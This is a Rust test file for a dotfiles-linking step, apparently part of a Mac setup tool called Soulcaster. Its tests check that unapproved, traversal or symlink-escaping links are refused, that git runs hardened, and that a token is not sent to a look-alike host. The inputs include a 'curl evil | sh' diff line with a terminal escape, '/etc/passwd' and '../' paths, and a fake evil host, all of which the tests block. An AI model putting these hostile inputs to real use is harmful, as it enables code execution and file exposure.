//! The Dotfiles step against real folders in a temporary `HOME`, with a fake standing in for git.
//! Nothing here touches the real home folder.

use std::collections::BTreeMap;
use std::fs;
use std::os::unix::fs::symlink;
use std::path::{Path, PathBuf};

use soulcaster_core::approval::{
    ApprovalStore, Approvals, CommitSha, DotfilesApproval, ScriptApproval,
};
use soulcaster_core::command::Reply;
use soulcaster_core::lint::{DEFAULT_CLONE_LOCATION, FindingKind};
use soulcaster_core::plan::DotfilesPlan;
use soulcaster_repo::dotfiles::{
    DotfilesError, DotfilesStep, LinkOutcome, LinkRefusal, MoveStanding, ScriptOutcome, UserStage,
    standing,
};
use soulcaster_repo::fake::{FakeGitHub, FileApprovals};
use soulcaster_repo::tools::Tools;

const SHA: &str = "a1b2c3d000000000000000000000000000000000";
const NEWER: &str = "e4f5a6b000000000000000000000000000000000";
const REPO: &str = "example-stranger/dotfiles";
const KEY: &str = "github.com/example-stranger/dotfiles";

struct Sandbox {
    _dir: tempfile::TempDir,
    home: PathBuf,
    tools: Tools,
    gh: FakeGitHub,
    store: FileApprovals,
}

fn commit() -> CommitSha {
    CommitSha::parse(SHA).unwrap()
}

/// A home folder with a clone already in place at the approved commit.
fn sandbox() -> Sandbox {
    let dir = tempfile::tempdir().unwrap();
    let home = fs::canonicalize(dir.path()).unwrap();
    let clone = home.join("Developer/dotfiles");
    // A real clone always has its objects folder, which the check reads.
    fs::create_dir_all(clone.join(".git/objects")).unwrap();
    fs::create_dir_all(clone.join("zsh")).unwrap();
    fs::create_dir_all(clone.join("nvim")).unwrap();
    fs::write(clone.join("zsh/zshrc"), "export EDITOR=nvim\n").unwrap();
    fs::write(clone.join("nvim/init.lua"), "-- hello\n").unwrap();
    fs::write(clone.join("setup.sh"), "#!/bin/sh\necho hi\n").unwrap();
    let tools = Tools::fixed(home.clone());
    let gh = FakeGitHub::new();
    gh.on_git("rev-parse", Reply::ok(format!("{SHA}\n")));
    gh.on_git(
        "--get",
        Reply::ok("https://github.com/example-stranger/dotfiles.git\n"),
    );
    let store = FileApprovals::new(home.join("approvals-test-double.json"));
    Sandbox {
        _dir: dir,
        home,
        tools,
        gh,
        store,
    }
}

fn plan(links: &[(&str, &str)]) -> DotfilesPlan {
    DotfilesPlan {
        repo: REPO.to_string(),
        links: links
            .iter()
            .map(|(t, s)| (t.to_string(), s.to_string()))
            .collect(),
        refused_links: vec![],
        install_script: None,
    }
}

fn approve(sandbox: &Sandbox, plan: &DotfilesPlan) {
    sandbox
        .store
        .write(&Approvals {
            packages: Default::default(),
            dotfiles: Some(DotfilesApproval {
                repo: KEY.to_string(),
                commit: commit(),
                links: plan.links.clone(),
            }),
            script: None,
        })
        .unwrap();
}

fn step(sandbox: &Sandbox) -> DotfilesStep<'_> {
    DotfilesStep {
        runner: &sandbox.gh,
        tools: &sandbox.tools,
        store: &sandbox.store,
        clone_location: DEFAULT_CLONE_LOCATION,
        stamp: "backup-1",
    }
}

fn apply(sandbox: &Sandbox, plan: &DotfilesPlan) -> BTreeMap<String, LinkOutcome> {
    step(sandbox)
        .apply_links(plan, UserStage::password_is_gone())
        .unwrap()
        .rows
        .into_iter()
        .map(|row| (row.target, row.outcome))
        .collect()
}

fn refusal(outcome: &LinkOutcome) -> &LinkRefusal {
    match outcome {
        LinkOutcome::Refused(why) => why,
        other => panic!("expected a refusal, got {other:?}"),
    }
}

fn is_link_to(path: &Path, target: &Path) -> bool {
    fs::read_link(path).is_ok_and(|found| found == target)
}

#[test]
fn nothing_links_without_an_approval_of_this_repo_at_this_commit_with_these_links() {
    let sandbox = sandbox();
    let plan = plan(&[("~/.zshrc", "zsh/zshrc")]);
    let no_record = step(&sandbox)
        .apply_links(&plan, UserStage::password_is_gone())
        .unwrap_err();
    assert_eq!(no_record, DotfilesError::NotApproved);

    // Another repo.
    let mut other = plan.clone();
    other.repo = "example-stranger/other".to_string();
    approve(&sandbox, &plan);
    assert_eq!(
        step(&sandbox)
            .apply_links(&other, UserStage::password_is_gone())
            .unwrap_err(),
        DotfilesError::NotApproved
    );

    // One more link than was approved.
    let more = crate::plan(&[("~/.zshrc", "zsh/zshrc"), ("~/.zshenv", "zsh/zshrc")]);
    assert_eq!(
        step(&sandbox)
            .apply_links(&more, UserStage::password_is_gone())
            .unwrap_err(),
        DotfilesError::NotApproved
    );
    assert!(!sandbox.home.join(".zshrc").exists());
    assert!(!sandbox.home.join(".zshenv").exists());
}

#[test]
fn links_are_applied_and_what_they_replace_is_backed_up() {
    let sandbox = sandbox();
    let plan = plan(&[
        ("~/.zshrc", "zsh/zshrc"),
        ("~/.config/nvim", "nvim"),
        ("~/.ssh/config", "zsh/zshrc"),
    ]);
    fs::write(sandbox.home.join(".zshrc"), "mine\n").unwrap();
    approve(&sandbox, &plan);
    let rows = apply(&sandbox, &plan);

    let clone = sandbox.home.join("Developer/dotfiles");
    assert!(is_link_to(
        &sandbox.home.join(".zshrc"),
        &clone.join("zsh/zshrc")
    ));
    assert!(is_link_to(
        &sandbox.home.join(".config/nvim"),
        &clone.join("nvim")
    ));
    let LinkOutcome::Linked {
        backup: Some(backup),
    } = &rows["~/.zshrc"]
    else {
        panic!("{:?}", rows["~/.zshrc"]);
    };
    assert_eq!(fs::read_to_string(backup).unwrap(), "mine\n");
    assert!(
        backup.starts_with(
            sandbox
                .home
                .join("Library/Application Support/Soulcaster/backups/backup-1")
        )
    );
    assert_eq!(rows["~/.config/nvim"], LinkOutcome::Linked { backup: None });
    use std::os::unix::fs::PermissionsExt;
    let ssh = fs::metadata(sandbox.home.join(".ssh")).unwrap();
    assert_eq!(
        ssh.permissions().mode() & 0o777,
        0o700,
        "a folder this step makes is private"
    );
}

#[test]
fn applying_twice_changes_nothing_the_second_time() {
    let sandbox = sandbox();
    let plan = plan(&[("~/.zshrc", "zsh/zshrc")]);
    approve(&sandbox, &plan);
    apply(&sandbox, &plan);
    let rows = apply(&sandbox, &plan);
    assert_eq!(rows["~/.zshrc"], LinkOutcome::AlreadyLinked);
    assert!(
        !sandbox
            .home
            .join("Library/Application Support/Soulcaster/backups")
            .exists()
    );
}

#[test]
fn an_existing_symlink_is_moved_aside_not_written_through() {
    let sandbox = sandbox();
    let victim = sandbox.home.join("precious.txt");
    fs::write(&victim, "keep me\n").unwrap();
    symlink(&victim, sandbox.home.join(".zshrc")).unwrap();
    let plan = plan(&[("~/.zshrc", "zsh/zshrc")]);
    approve(&sandbox, &plan);
    let rows = apply(&sandbox, &plan);
    assert_eq!(fs::read_to_string(&victim).unwrap(), "keep me\n");
    let LinkOutcome::Linked {
        backup: Some(backup),
    } = &rows["~/.zshrc"]
    else {
        panic!("{:?}", rows["~/.zshrc"]);
    };
    assert_eq!(fs::read_link(backup).unwrap(), victim);
}

#[test]
fn a_symlink_above_the_link_is_refused_so_nothing_lands_outside_home() {
    let sandbox = sandbox();
    let outside = tempfile::tempdir().unwrap();
    symlink(outside.path(), sandbox.home.join(".config")).unwrap();
    let plan = plan(&[("~/.config/nvim/init.lua", "nvim/init.lua")]);
    approve(&sandbox, &plan);
    let rows = apply(&sandbox, &plan);
    assert!(
        matches!(
            refusal(&rows["~/.config/nvim/init.lua"]),
            LinkRefusal::SymlinkInPath { .. }
        ),
        "{rows:?}"
    );
    assert_eq!(fs::read_dir(outside.path()).unwrap().count(), 0);
}

#[test]
fn a_file_above_the_link_is_refused() {
    let sandbox = sandbox();
    fs::write(sandbox.home.join(".config"), "a file").unwrap();
    let plan = plan(&[("~/.config/nvim", "nvim")]);
    approve(&sandbox, &plan);
    let rows = apply(&sandbox, &plan);
    assert!(matches!(
        refusal(&rows["~/.config/nvim"]),
        LinkRefusal::NotAFolder { .. }
    ));
    assert_eq!(
        fs::read_to_string(sandbox.home.join(".config")).unwrap(),
        "a file"
    );
}

#[test]
fn every_location_lint_refuses_is_refused_here_too_even_if_the_plan_forgot() {
    let sandbox = sandbox();
    let plan = plan(&[
        ("~/Documents", "nvim"),
        ("~/.zshrc", "zsh/zshrc"),
        ("~/.ZSHRC", "zsh/zshrc"),
        ("~/.a", "nvim"),
        ("~/.a/b", "nvim"),
        ("~/Developer/dotfiles/hooks", "nvim"),
        (
            "~/Library/Application Support/Soulcaster/machine.json",
            "zsh/zshrc",
        ),
    ]);
    fs::create_dir(sandbox.home.join("Documents")).unwrap();
    fs::write(sandbox.home.join("Documents/thesis.txt"), "years of work").unwrap();
    approve(&sandbox, &plan);
    let rows = apply(&sandbox, &plan);
    for target in plan.links.keys() {
        assert!(
            matches!(rows[target], LinkOutcome::Refused(LinkRefusal::Lint(_))),
            "{target}: {:?}",
            rows[target]
        );
    }
    assert!(matches!(
        rows["~/Documents"],
        LinkOutcome::Refused(LinkRefusal::Lint(FindingKind::LinkProtected))
    ));
    assert_eq!(
        fs::read_to_string(sandbox.home.join("Documents/thesis.txt")).unwrap(),
        "years of work"
    );
    assert!(!sandbox.home.join(".zshrc").exists());
    assert!(!sandbox.home.join(".a").exists());
}

#[test]
fn a_location_outside_home_or_with_a_hostile_segment_is_refused_even_if_the_schema_was_skipped() {
    let sandbox = sandbox();
    let plan = plan(&[
        ("~/../escaped", "nvim"),
        ("/etc/evil", "nvim"),
        ("~/.git/config", "nvim"),
        ("~/.GIT/config", "nvim"),
        ("~/a/./b", "nvim"),
        ("~/a//b", "nvim"),
        ("~", "nvim"),
        ("~/", "nvim"),
        ("~/ok\nno", "nvim"),
    ]);
    approve(&sandbox, &plan);
    let rows = apply(&sandbox, &plan);
    for target in plan.links.keys() {
        assert_eq!(
            refusal(&rows[target]),
            &LinkRefusal::BadLocation,
            "{target:?}"
        );
    }
    assert!(!sandbox.home.parent().unwrap().join("escaped").exists());
}

#[test]
fn a_repo_symlink_leaving_the_repo_or_reaching_git_is_refused() {
    let sandbox = sandbox();
    let clone = sandbox.home.join("Developer/dotfiles");
    let outside = sandbox.home.join("secret.txt");
    fs::write(&outside, "secret").unwrap();
    symlink(&outside, clone.join("outward")).unwrap();
    symlink("../..", clone.join("up")).unwrap();
    symlink(".git", clone.join("gitdir")).unwrap();
    fs::write(clone.join(".git/config"), "[core]").unwrap();
    symlink("zsh/zshrc", clone.join("inside")).unwrap();
    let plan = plan(&[
        ("~/.one", "outward"),
        ("~/.two", "up/secret.txt"),
        ("~/.three", "gitdir/config"),
        ("~/.four", ".git/config"),
        ("~/.five", "missing/file"),
        ("~/.six", "../../secret.txt"),
        ("~/.seven", "-rf"),
        ("~/.eight", "/etc/passwd"),
        ("~/.nine", "inside"),
    ]);
    approve(&sandbox, &plan);
    let rows = apply(&sandbox, &plan);
    assert_eq!(refusal(&rows["~/.one"]), &LinkRefusal::SourceLeavesRepo);
    assert_eq!(refusal(&rows["~/.two"]), &LinkRefusal::SourceLeavesRepo);
    assert_eq!(refusal(&rows["~/.three"]), &LinkRefusal::SourceLeavesRepo);
    assert_eq!(refusal(&rows["~/.four"]), &LinkRefusal::SourceLeavesRepo);
    assert_eq!(refusal(&rows["~/.five"]), &LinkRefusal::SourceMissing);
    assert_eq!(refusal(&rows["~/.six"]), &LinkRefusal::SourceLeavesRepo);
    assert_eq!(refusal(&rows["~/.seven"]), &LinkRefusal::SourceLeavesRepo);
    assert_eq!(refusal(&rows["~/.eight"]), &LinkRefusal::SourceLeavesRepo);
    assert!(
        matches!(rows["~/.nine"], LinkOutcome::Linked { .. }),
        "inside is fine"
    );
    for name in [
        ".one", ".two", ".three", ".four", ".five", ".six", ".seven", ".eight",
    ] {
        assert!(
            fs::symlink_metadata(sandbox.home.join(name)).is_err(),
            "{name}"
        );
    }
}

#[test]
fn a_link_of_ours_already_at_that_location_is_not_replaced_by_a_case_variant() {
    // The file system says they are one file even when the two spellings got past the lint.
    let sandbox = sandbox();
    let clone = sandbox.home.join("Developer/dotfiles");
    symlink(clone.join("nvim"), sandbox.home.join(".zshrc")).unwrap();
    let plan = plan(&[("~/.zshrc", "zsh/zshrc")]);
    approve(&sandbox, &plan);
    let rows = apply(&sandbox, &plan);
    assert_eq!(refusal(&rows["~/.zshrc"]), &LinkRefusal::AnotherLinkHere);
    assert!(is_link_to(
        &sandbox.home.join(".zshrc"),
        &clone.join("nvim")
    ));
}

#[test]
fn links_wait_for_a_new_preview_when_the_repo_on_disk_is_not_the_approved_commit() {
    let sandbox = sandbox();
    sandbox
        .gh
        .on_git("rev-parse", Reply::ok(format!("{NEWER}\n")));
    let plan = plan(&[("~/.zshrc", "zsh/zshrc")]);
    approve(&sandbox, &plan);
    let error = step(&sandbox)
        .apply_links(&plan, UserStage::password_is_gone())
        .unwrap_err();
    assert_eq!(
        error,
        DotfilesError::PastApproved {
            head: CommitSha::parse(NEWER).unwrap()
        }
    );
    assert!(!sandbox.home.join(".zshrc").exists());
}

#[test]
fn a_clone_is_fetched_by_commit_and_refused_if_git_lands_anywhere_else() {
    let sandbox = sandbox();
    fs::remove_dir_all(sandbox.home.join("Developer/dotfiles")).unwrap();
    let plan = plan(&[("~/.zshrc", "zsh/zshrc")]);
    approve(&sandbox, &plan);
    // A force-moved name: git reports some other commit after the checkout.
    sandbox
        .gh
        .on_git("rev-parse", Reply::ok(format!("{NEWER}\n")));
    let error = step(&sandbox)
        .ensure_clone(&plan, UserStage::password_is_gone())
        .unwrap_err();
    assert_eq!(
        error,
        DotfilesError::CommitMismatch {
            wanted: commit(),
            found: CommitSha::parse(NEWER).unwrap()
        }
    );
    assert!(
        !sandbox.home.join("Developer/dotfiles").exists(),
        "a clone that isn't the approved commit isn't kept"
    );

    // Every git command fetches the SHA and nothing that can move, and is hardened.
    let calls = sandbox.gh.calls();
    let fetch = calls
        .iter()
        .find(|c| c.args.iter().any(|a| a == "fetch"))
        .expect("a fetch");
    assert_eq!(fetch.args.last().unwrap(), SHA);
    assert!(fetch.args.iter().any(|a| a == "--depth=1"));
    assert!(fetch.args.iter().any(|a| a == "--no-tags"));
    assert!(fetch.args.iter().any(|a| a == "--no-recurse-submodules"));
    let dash = fetch.args.iter().position(|a| a == "--").unwrap();
    assert_eq!(fetch.args[dash + 1], "origin");
    for call in calls.iter().filter(|c| c.program.ends_with("git")) {
        let line = call.args.join(" ");
        assert!(line.contains("core.hooksPath=/dev/null"), "{line}");
        assert!(
            call.env
                .contains(&("GIT_CONFIG_GLOBAL".to_string(), "/dev/null".to_string())),
            "{line}"
        );
        assert!(
            call.env
                .contains(&("GIT_CONFIG_NOSYSTEM".to_string(), "1".to_string())),
            "{line}"
        );
    }
    let init = calls
        .iter()
        .find(|c| c.args.iter().any(|a| a == "init"))
        .unwrap();
    assert!(
        init.args.iter().any(|a| a == "--template="),
        "no template hooks"
    );
}

#[test]
fn a_clone_location_with_something_already_there_is_left_alone() {
    let sandbox = sandbox();
    let clone = sandbox.home.join("Developer/dotfiles");
    fs::remove_dir_all(&clone).unwrap();
    fs::create_dir_all(&clone).unwrap();
    fs::write(clone.join("thesis.txt"), "mine").unwrap();
    let plan = plan(&[("~/.zshrc", "zsh/zshrc")]);
    approve(&sandbox, &plan);
    assert_eq!(
        step(&sandbox)
            .ensure_clone(&plan, UserStage::password_is_gone())
            .unwrap_err(),
        DotfilesError::LocationBusy
    );
    assert_eq!(
        fs::read_to_string(clone.join("thesis.txt")).unwrap(),
        "mine"
    );
    assert!(sandbox.gh.calls().is_empty());
}

#[test]
fn a_clone_location_reached_through_a_symlink_or_a_gitfile_is_refused() {
    let sandbox = sandbox();
    let outside = tempfile::tempdir().unwrap();
    fs::remove_dir_all(sandbox.home.join("Developer")).unwrap();
    symlink(outside.path(), sandbox.home.join("Developer")).unwrap();
    let plan = plan(&[("~/.zshrc", "zsh/zshrc")]);
    approve(&sandbox, &plan);
    assert_eq!(
        step(&sandbox)
            .ensure_clone(&plan, UserStage::password_is_gone())
            .unwrap_err(),
        DotfilesError::LocationBusy
    );
    assert_eq!(fs::read_dir(outside.path()).unwrap().count(), 0);

    let sandbox = crate::sandbox();
    let clone = sandbox.home.join("Developer/dotfiles");
    fs::remove_dir_all(clone.join(".git")).unwrap();
    fs::write(clone.join(".git"), "gitdir: /tmp/elsewhere\n").unwrap();
    approve(&sandbox, &plan);
    assert_eq!(
        step(&sandbox)
            .ensure_clone(&plan, UserStage::password_is_gone())
            .unwrap_err(),
        DotfilesError::LocationBusy
    );
}

#[test]
fn an_existing_clone_of_some_other_repo_is_not_used() {
    let sandbox = sandbox();
    sandbox
        .gh
        .on_git("--get", Reply::ok("https://github.com/evil/repo.git\n"));
    let plan = plan(&[("~/.zshrc", "zsh/zshrc")]);
    approve(&sandbox, &plan);
    assert_eq!(
        step(&sandbox)
            .ensure_clone(&plan, UserStage::password_is_gone())
            .unwrap_err(),
        DotfilesError::DifferentRepo
    );
}

#[test]
fn the_token_goes_only_to_github_never_to_another_host() {
    let sandbox = sandbox();
    fs::remove_dir_all(sandbox.home.join("Developer/dotfiles")).unwrap();
    let mut other = plan(&[("~/.zshrc", "zsh/zshrc")]);
    other.repo = "https://github.com.evil.example/you/dotfiles".to_string();
    sandbox
        .store
        .write(&Approvals {
            packages: Default::default(),
            dotfiles: Some(DotfilesApproval {
                repo: "https://github.com.evil.example/you/dotfiles".to_string(),
                commit: commit(),
                links: other.links.clone(),
            }),
            script: None,
        })
        .unwrap();
    sandbox
        .gh
        .on_git("rev-parse", Reply::ok(format!("{SHA}\n")));
    step(&sandbox)
        .ensure_clone(&other, UserStage::password_is_gone())
        .unwrap();
    for call in sandbox.gh.calls() {
        let line = call.args.join(" ");
        assert!(!line.contains("git-credential"), "{line}");
    }

    let sandbox = crate::sandbox();
    fs::remove_dir_all(sandbox.home.join("Developer/dotfiles")).unwrap();
    let plan = plan(&[("~/.zshrc", "zsh/zshrc")]);
    approve(&sandbox, &plan);
    step(&sandbox)
        .ensure_clone(&plan, UserStage::password_is_gone())
        .unwrap();
    let fetch = sandbox
        .gh
        .calls()
        .into_iter()
        .find(|c| c.args.iter().any(|a| a == "fetch"))
        .unwrap();
    let line = fetch.args.join(" ");
    assert!(
        line.contains("credential.https://github.com.helper=!")
            && line.contains("auth git-credential"),
        "{line}"
    );
}

fn script_plan() -> DotfilesPlan {
    let mut plan = plan(&[("~/.zshrc", "zsh/zshrc")]);
    plan.install_script = Some("setup.sh".to_string());
    plan
}

fn approve_script(sandbox: &Sandbox, plan: &DotfilesPlan, path: &str) {
    let mut approvals = sandbox.store.read().unwrap();
    approvals.script = Some(ScriptApproval {
        repo: KEY.to_string(),
        commit: commit(),
        path: path.to_string(),
        ran: false,
    });
    sandbox.store.write(&approvals).unwrap();
    let _ = plan;
}

fn run_script(sandbox: &Sandbox, plan: &DotfilesPlan) -> ScriptOutcome {
    step(sandbox).run_script(plan, UserStage::password_is_gone(), &mut |_, _| {})
}

#[test]
fn the_script_needs_its_own_approval_and_runs_under_zsh_f_with_a_clean_environment() {
    let sandbox = sandbox();
    let plan = script_plan();
    approve(&sandbox, &plan);
    // The repo is approved and the script isn't, so nothing runs.
    assert_eq!(run_script(&sandbox, &plan), ScriptOutcome::NotApproved);
    assert!(
        !sandbox
            .gh
            .calls()
            .iter()
            .any(|c| c.program.ends_with("zsh"))
    );

    approve_script(&sandbox, &plan, "setup.sh");
    assert_eq!(
        run_script(&sandbox, &plan),
        ScriptOutcome::Ran { success: true }
    );
    let call = sandbox
        .gh
        .calls()
        .into_iter()
        .find(|c| c.program.ends_with("zsh"))
        .expect("the script ran");
    let abs = sandbox.home.join("Developer/dotfiles/setup.sh");
    assert_eq!(call.args, ["-f", "--", abs.to_str().unwrap()]);
    assert_eq!(call.cwd, Some(sandbox.home.join("Developer/dotfiles")));
    let line = format!("{:?}", call.env);
    assert!(
        !line.contains("ASKPASS") && !line.contains("TOKEN"),
        "{line}"
    );

    // It runs once for this commit.
    assert_eq!(run_script(&sandbox, &plan), ScriptOutcome::AlreadyRan);
}

#[test]
fn a_failing_script_is_reported_and_does_not_stop_anything() {
    let sandbox = sandbox();
    let plan = script_plan();
    approve(&sandbox, &plan);
    approve_script(&sandbox, &plan, "setup.sh");
    sandbox.gh.on_program("zsh", Reply::fails(3, "boom"));
    assert_eq!(
        run_script(&sandbox, &plan),
        ScriptOutcome::Ran { success: false }
    );
}

#[test]
fn the_script_does_not_run_past_its_commit_or_with_changes_on_disk_or_through_a_symlink() {
    // The person pulled by hand.
    let sandbox = crate::sandbox();
    let plan = script_plan();
    approve(&sandbox, &plan);
    approve_script(&sandbox, &plan, "setup.sh");
    sandbox
        .gh
        .on_git("rev-parse", Reply::ok(format!("{NEWER}\n")));
    assert_eq!(run_script(&sandbox, &plan), ScriptOutcome::HeldForReview);

    // The file changed on disk since the approved commit.
    let sandbox = crate::sandbox();
    approve(&sandbox, &plan);
    approve_script(&sandbox, &plan, "setup.sh");
    sandbox.gh.on_git("status", Reply::ok(" M setup.sh\n"));
    assert_eq!(run_script(&sandbox, &plan), ScriptOutcome::HeldForReview);

    // Someone else's path in the approval.
    let sandbox = crate::sandbox();
    approve(&sandbox, &plan);
    approve_script(&sandbox, &plan, "other.sh");
    assert_eq!(run_script(&sandbox, &plan), ScriptOutcome::NotApproved);

    // A symlink to something else.
    let sandbox = crate::sandbox();
    let clone = sandbox.home.join("Developer/dotfiles");
    fs::remove_file(clone.join("setup.sh")).unwrap();
    let elsewhere = sandbox.home.join("evil.sh");
    fs::write(&elsewhere, "#!/bin/sh\n").unwrap();
    symlink(&elsewhere, clone.join("setup.sh")).unwrap();
    approve(&sandbox, &plan);
    approve_script(&sandbox, &plan, "setup.sh");
    assert_eq!(run_script(&sandbox, &plan), ScriptOutcome::HeldForReview);
    assert!(
        !sandbox
            .gh
            .calls()
            .iter()
            .any(|c| c.program.ends_with("zsh"))
    );
}

#[test]
fn the_engine_stays_at_the_approved_commit_until_a_new_approval_says_otherwise() {
    let links = plan(&[("~/.zshrc", "zsh/zshrc")]);
    let approvals = Approvals {
        packages: Default::default(),
        dotfiles: Some(DotfilesApproval {
            repo: KEY.to_string(),
            commit: commit(),
            links: links.links.clone(),
        }),
        script: None,
    };
    let newer = CommitSha::parse(NEWER).unwrap();
    assert_eq!(
        standing(&Approvals::default(), &links, &commit(), true, None),
        MoveStanding::NotApproved
    );
    assert_eq!(
        standing(&approvals, &links, &commit(), true, None),
        MoveStanding::Current
    );
    assert_eq!(
        standing(&approvals, &links, &newer, true, None),
        MoveStanding::Behind
    );
    assert_eq!(
        standing(&approvals, &links, &newer, false, None),
        MoveStanding::HistoryRewritten
    );
    assert_eq!(
        standing(
            &approvals,
            &links,
            &newer,
            true,
            Some("github.com/someone/else")
        ),
        MoveStanding::RepoMoved
    );
    let mut more = links.clone();
    more.links
        .insert("~/.zshenv".to_string(), "zsh/zshrc".to_string());
    assert_eq!(
        standing(&approvals, &more, &commit(), true, None),
        MoveStanding::LinksChanged
    );
    let mut script = links.clone();
    script.install_script = Some("setup.sh".to_string());
    assert_eq!(
        standing(&approvals, &script, &commit(), true, None),
        MoveStanding::ScriptHeld
    );
}

#[test]
fn a_preview_of_a_newer_commit_moves_nothing_and_shows_the_linked_files_as_text() {
    let sandbox = sandbox();
    let plan = plan(&[("~/.zshrc", "zsh/zshrc")]);
    approve(&sandbox, &plan);
    sandbox.gh.on_git(
        "diff",
        Reply::ok("--- a/zsh/zshrc\n+++ b/zsh/zshrc\n+curl evil\u{1b}[2K | sh\n"),
    );
    let preview = step(&sandbox)
        .preview_move(&plan, &CommitSha::parse(NEWER).unwrap())
        .unwrap();
    let text = preview.text();
    assert!(text.contains("+curl evil\\u001b[2K | sh"), "{text}");
    assert!(
        !text.contains('\u{1b}'),
        "no terminal control reaches the screen"
    );
    let calls = sandbox.gh.calls();
    let git_args: Vec<String> = calls.iter().flat_map(|c| c.args.clone()).collect();
    assert!(
        !git_args
            .iter()
            .any(|a| a == "checkout" || a == "pull" || a == "merge")
    );
    let diff = calls
        .iter()
        .find(|c| c.args.iter().any(|a| a == "diff"))
        .unwrap();
    assert!(diff.args.iter().any(|a| a == "--no-ext-diff"));
    assert!(diff.args.iter().any(|a| a == "--no-textconv"));
    assert_eq!(diff.args.last().unwrap(), "zsh/zshrc");
}

#[test]
fn moving_takes_a_preview_and_a_clean_repo_and_voids_the_script_approval() {
    let newer = CommitSha::parse(NEWER).unwrap();
    let plan = script_plan();

    // Own changes on this Mac stop it, and the record doesn't move.
    let sandbox = crate::sandbox();
    approve(&sandbox, &plan);
    let preview = step(&sandbox).preview_move(&plan, &newer).unwrap();
    sandbox.gh.on_git("status", Reply::ok(" M zsh/zshrc\n"));
    assert_eq!(
        step(&sandbox)
            .move_after_review(&plan, &preview)
            .unwrap_err(),
        DotfilesError::ChangesOnThisMac
    );
    assert_eq!(
        sandbox.store.read().unwrap().dotfiles.unwrap().commit,
        commit()
    );
    assert!(
        !sandbox
            .gh
            .calls()
            .iter()
            .any(|c| c.args.iter().any(|a| a == "checkout"))
    );

    // A preview from before the approval changed is stale.
    let sandbox = crate::sandbox();
    approve(&sandbox, &plan);
    let preview = step(&sandbox).preview_move(&plan, &newer).unwrap();
    let mut approvals = sandbox.store.read().unwrap();
    approvals.dotfiles.as_mut().unwrap().commit = newer.clone();
    sandbox.store.write(&approvals).unwrap();
    assert_eq!(
        step(&sandbox)
            .move_after_review(&plan, &preview)
            .unwrap_err(),
        DotfilesError::NotApproved
    );

    // With no approval at all there's no preview to take, either.
    let sandbox = crate::sandbox();
    assert_eq!(
        step(&sandbox).preview_move(&plan, &newer).unwrap_err(),
        DotfilesError::NotApproved
    );

    // The good path: the checkout names the commit, and the record follows. The script doesn't.
    let sandbox = crate::sandbox();
    approve(&sandbox, &plan);
    approve_script(&sandbox, &plan, "setup.sh");
    let preview = step(&sandbox).preview_move(&plan, &newer).unwrap();
    sandbox
        .gh
        .on_git("rev-parse", Reply::ok(format!("{NEWER}\n")));
    step(&sandbox).move_after_review(&plan, &preview).unwrap();
    let checkout = sandbox
        .gh
        .calls()
        .into_iter()
        .find(|c| c.args.iter().any(|a| a == "checkout"))
        .unwrap();
    assert_eq!(checkout.args.last().unwrap(), NEWER);
    let record = sandbox.store.read().unwrap();
    assert_eq!(record.dotfiles.unwrap().commit, newer);
    assert_eq!(record.script, None);

    // Git landing somewhere else is refused, and the approval stays where it was.
    let sandbox = crate::sandbox();
    approve(&sandbox, &plan);
    let preview = step(&sandbox).preview_move(&plan, &newer).unwrap();
    assert!(matches!(
        step(&sandbox)
            .move_after_review(&plan, &preview)
            .unwrap_err(),
        DotfilesError::CommitMismatch { .. }
    ));
    assert_eq!(
        sandbox.store.read().unwrap().dotfiles.unwrap().commit,
        commit()
    );
}

#[test]
fn a_file_store_is_only_a_test_double_and_a_bad_record_means_nothing_approved() {
    let sandbox = sandbox();
    let plan = plan(&[("~/.zshrc", "zsh/zshrc")]);
    fs::write(sandbox.home.join("approvals-test-double.json"), "{not json").unwrap();
    assert_eq!(
        step(&sandbox)
            .apply_links(&plan, UserStage::password_is_gone())
            .unwrap_err(),
        DotfilesError::NotApproved
    );
}

#[test]
fn every_word_on_screen_avoids_git_words() {
    for refusal in [
        LinkRefusal::BadLocation,
        LinkRefusal::SourceMissing,
        LinkRefusal::SourceLeavesRepo,
        LinkRefusal::AnotherLinkHere,
        LinkRefusal::PathChanged,
        LinkRefusal::SymlinkInPath {
            at: "~/.config".to_string(),
        },
        LinkRefusal::NotAFolder {
            at: "~/.config".to_string(),
        },
        LinkRefusal::Io,
    ] {
        soulcaster_repo::assert_no_git_words(&refusal.to_string());
    }
    for error in [
        DotfilesError::NotApproved,
        DotfilesError::GitMissing,
        DotfilesError::LocationBusy,
        DotfilesError::DifferentRepo,
        DotfilesError::ChangesOnThisMac,
        DotfilesError::Offline,
        DotfilesError::CommitGone,
        DotfilesError::PastApproved { head: commit() },
        DotfilesError::CommitMismatch {
            wanted: commit(),
            found: commit(),
        },
    ] {
        soulcaster_repo::assert_no_git_words(&error.to_string());
    }
}
